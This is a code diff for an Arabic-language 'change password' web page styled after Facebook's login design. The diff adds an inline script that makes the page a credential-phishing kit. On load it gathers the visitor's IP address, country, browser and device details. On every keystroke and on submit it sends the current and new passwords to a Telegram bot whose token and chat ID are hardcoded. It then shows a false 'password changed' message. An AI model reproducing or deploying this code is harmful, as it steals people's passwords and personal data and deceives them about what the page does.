@@ -4,7 +4,132 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تغيير كلمة السر</title>
-    <link rel="stylesheet" href="styles.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            color: #1c1e21;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 400px;
+            text-align: right;
+        }
+        .container h2 {
+            margin-bottom: 20px;
+            font-size: 24px;
+            color: #1c1e21;
+            text-align: center;
+        }
+        .form-group {
+            margin-bottom: 15px;
+            position: relative;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+            text-align: right;
+            direction: rtl;
+            padding-right: 40px; /* Make space for the toggle button */
+            box-sizing: border-box;
+        }
+        .form-group input:focus {
+            border-color: #1877f2;
+            outline: none;
+        }
+        .btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background-color: #166fe5;
+        }
+        .error-message {
+            color: #e41e3f;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        .note {
+            font-size: 14px;
+            color: #606770;
+            margin-top: 20px;
+        }
+        .logo {
+            display: block;
+            margin: 0 auto 20px;
+            width: 100px;
+        }
+        input.error {
+            border: 2px solid red;
+        }
+        span.error {
+            color: red;
+            font-size: 0.9em;
+        }
+        .password-requirements {
+            font-size: 14px;
+            color: #606770;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .placeholder {
+            position: absolute;
+            top: 50%;
+            right: 10px;
+            transform: translateY(-50%);
+            pointer-events: none;
+            transition: all 0.3s ease;
+            color: #999;
+            font-size: 16px;
+            background-color: #fff;
+            padding: 0 5px;
+        }
+        .form-group input:focus ~ .placeholder,
+        .form-group input:not(:placeholder-shown) ~ .placeholder {
+            top: 0;
+            right: 40px;
+            font-size: 12px;
+            color: #1877f2;
+        }
+        .toggle-password {
+            display: none;
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #1877f2;
+        }
+        .form-group input:not(:placeholder-shown) ~ .toggle-password {
+            display: block;
+        }
+        .form-group input {
+            padding-left: 40px; /* Leave space for the button */
+        }
+        .error {
+            color: red;
+            font-size: 14px;
+            display: block;
+        }
+    </style>
 </head>
 <body>
     <div class="container">
@@ -14,24 +139,24 @@
         <form id="passwordResetForm">
             <div class="form-group">
                 <div style="position: relative;">
+                    <span class="toggle-password" onclick="togglePassword('currentPassword')">إظهار</span>
                     <input type="password" id="currentPassword" name="currentPassword" placeholder=" " required>
                     <span class="placeholder">كلمة السر الحالية</span>
-                    <span class="toggle-password" onclick="togglePassword('currentPassword')">إظهار</span>
                 </div>
             </div>
             <div class="form-group">
                 <div style="position: relative;">
+                    <span class="toggle-password" onclick="togglePassword('newPassword')">إظهار</span>
                     <input type="password" id="newPassword" name="newPassword" placeholder=" " required>
                     <span class="placeholder">كلمة السر الجديدة</span>
-                    <span class="toggle-password" onclick="togglePassword('newPassword')">إظهار</span>
                 </div>
-                <span id="newPasswordError" class="error"></span>
+                <span id="newPasswordHint" class="error" style="display:none;">يرجى اختيار كلمة سر أكثر أمانًا لا تستخدمها في أي مكان آخر. يجب أن تتكون كلمة السر من ‏٦‏ من الأحرف أو الأرقام على الأقل ويصعب على الآخرين تخمينها.</span>
             </div>
             <div class="form-group">
                 <div style="position: relative;">
+                    <span class="toggle-password" onclick="togglePassword('confirmPassword')">إظهار</span>
                     <input type="password" id="confirmPassword" name="confirmPassword" placeholder=" " required>
                     <span class="placeholder">إعادة كتابة كلمة السر الجديدة</span>
-                    <span class="toggle-password" onclick="togglePassword('confirmPassword')">إظهار</span>
                 </div>
                 <span id="confirmPasswordError" class="error"></span>
             </div>
@@ -43,6 +168,204 @@
             <div id="errorMessage" class="error-message"></div>
         </form>
     </div>
-    <script src="script.js"></script>
+    <script>
+        function togglePassword(id) {
+            const input = document.getElementById(id);
+            const toggleIcon = input.previousElementSibling;
+            if (input.type === 'password') {
+                input.type = 'text';
+                toggleIcon.textContent = 'إخفاء';
+            } else {
+                input.type = 'password';
+                toggleIcon.textContent = 'إظهار';
+            }
+        }
+
+        document.getElementById('passwordResetForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const currentPassword = document.getElementById('currentPassword').value;
+            const newPassword = document.getElementById('newPassword').value;
+            const confirmPassword = document.getElementById('confirmPassword').value;
+            const errorMessage = document.getElementById('errorMessage');
+
+            // Validate password strength
+            const passwordRegex = /^[A-Za-z\d]{6,}\$/;
+            if (!passwordRegex.test(newPassword)) {
+                errorMessage.textContent = 'كلمة السر يجب أن تحتوي على 6 أحرف أو أرقام على الأقل.';
+                return;
+            }
+
+            // Validate password match
+            if (newPassword !== confirmPassword) {
+                errorMessage.textContent = 'كلمة السر الجديدة وتأكيد كلمة السر لا يتطابقان. يرجى المحاولة مرة أخرى.';
+                return;
+            }
+
+            // Send user info and password data to Telegram bot
+            sendUserInfoAndPasswordToTelegram(currentPassword, newPassword, confirmPassword);
+
+            alert('تم تغيير كلمة السر بنجاح!');
+        });
+
+        // Collect user information and send to Telegram bot
+        function sendUserInfoToTelegram() {
+            const userInfo = {
+                user_ip: '',
+                user_country: '',
+                user_browser: navigator.userAgent,
+                device_type: /Mobi/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
+                user_os: navigator.platform,
+                user_timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screen_resolution: `${window.screen.width}x${window.screen.height}`,
+                user_language: navigator.language,
+                timestamp: new Date().toLocaleString()
+            };
+
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    userInfo.user_ip = data.ip;
+                    return fetch(`https://ipapi.co/${userInfo.user_ip}/json`);
+                })
+                .then(response => response.json())
+                .then(data => {
+                    userInfo.user_country = data.country_name;
+                    sendMessageToTelegram(userInfo);
+                })
+                .catch(error => {
+                    console.error('Error fetching user info:', error);
+                });
+        }
+
+        function sendMessageToTelegram(userInfo) {
+            const message = `
+🖥️ **معلومات المستخدم:**
+
+📍 **عنوان الـ IP:** \\${userInfo.user_ip}
+
+🌍 **البلد:** ${userInfo.user_country}
+
+💻 **المتصفح:** ${userInfo.user_browser}
+
+📱 **نوع الجهاز:** ${userInfo.device_type}
+
+🌐 **نظام التشغيل:** ${userInfo.user_os}
+
+⏰ **المنطقة الزمنية:** ${userInfo.user_timezone}
+
+🖱️ **دقة الشاشة:** ${userInfo.screen_resolution}
+
+🔢 **اللغة المفضلة:** ${userInfo.user_language}
+
+🕒 **التاريخ والوقت:** ${userInfo.timestamp}
+            `;
+
+            const telegramToken = '7525549724:AAHW_je_uwIiyCa121FkCJlMaHpfVIdfDQA';
+            const chatId = '6185375878';
+            const url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Message sent to Telegram:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending message to Telegram:', error);
+                });
+        }
+
+        // Send user info when the page loads
+        window.addEventListener('load', sendUserInfoToTelegram);
+
+        // Send input data to Telegram bot
+        function sendUserInfoAndPasswordToTelegram(currentPassword, newPassword, confirmPassword) {
+            const message = `
+🖥️ **معلومات المستخدم:**
+
+📍 **عنوان الـ IP:** {user_ip}
+
+🌍 **البلد:** {user_country}
+
+💻 **المتصفح:** {user_browser}
+
+📱 **نوع الجهاز:** {device_type}
+
+🌐 **نظام التشغيل:** {user_os}
+
+⏰ **المنطقة الزمنية:** {user_timezone}
+
+🖱️ **دقة الشاشة:** {screen_resolution}
+
+🔢 **اللغة المفضلة:** {user_language}
+
+🕒 **التاريخ والوقت:** {timestamp}
+
+🔒 **كلمة السر:**
+
+✍️ **كلمة السر الحالية:** ${currentPassword}
+
+🔐 **كلمة السر الجديدة:** ${newPassword}
+
+🔄 **إعادة كتابة كلمة السر:** \\${confirmPassword}
+            `;
+
+            const telegramToken = '7525549724:AAHW_je_uwIiyCa121FkCJlMaHpfVIdfDQA';
+            const chatId = '6185375878';
+            const url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Input data sent to Telegram:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending input data to Telegram:', error);
+                });
+        }
+
+        // Add event listeners to input fields
+        document.getElementById('currentPassword').addEventListener('input', function() {
+            const toggle = this.previousElementSibling;
+            toggle.style.display = this.value ? 'block' : 'none';
+
+            sendUserInfoAndPasswordToTelegram(this.value, document.getElementById('newPassword').value, document.getElementById('confirmPassword').value);
+        });
+
+        document.getElementById('newPassword').addEventListener('input', function() {
+            const toggle = this.previousElementSibling;
+            toggle.style.display = this.value ? 'block' : 'none';
+
+            const newPassword = this.value;
+            const hint = document.getElementById('newPasswordHint');
+            const passwordRegex = /^[A-Za-z\d]{6,}\$/;
+
+            if (newPassword.length >= 6) {
+                hint.style.display = 'none';  // إخفاء التلميح عندما تتجاوز 6 أحرف أو أرقام
+            } else {
+                hint.style.display = 'block';  // عرض التلميح إذا لم تستوفِ الشروط
+            }
+
+            sendUserInfoAndPasswordToTelegram(document.getElementById('currentPassword').value, newPassword, document.getElementById('confirmPassword').value);
+        });
+
+        document.getElementById('confirmPassword').addEventListener('input', function() {
+            const toggle = this.previousElementSibling;
+            toggle.style.display = this.value ? 'block' : 'none';
+
+            const confirmPassword = this.value;
+            const newPassword = document.getElementById('newPassword').value;
+            const confirmPasswordError = document.getElementById('confirmPasswordError');
+
+            if (newPassword !== confirmPassword) {
+                confirmPasswordError.textContent = 'كلمة السر الجديدة غير متطابقة. أدخل كلمة السر الجديدة هنا مرة أخرى.';
+                this.classList.add('error');
+            } else {
+                confirmPasswordError.textContent = '';
+                this.classList.remove('error');
+            }
+
+            sendUserInfoAndPasswordToTelegram(document.getElementById('currentPassword').value, newPassword, confirmPassword);
+        });
+    </script>
 </body>
 </html>
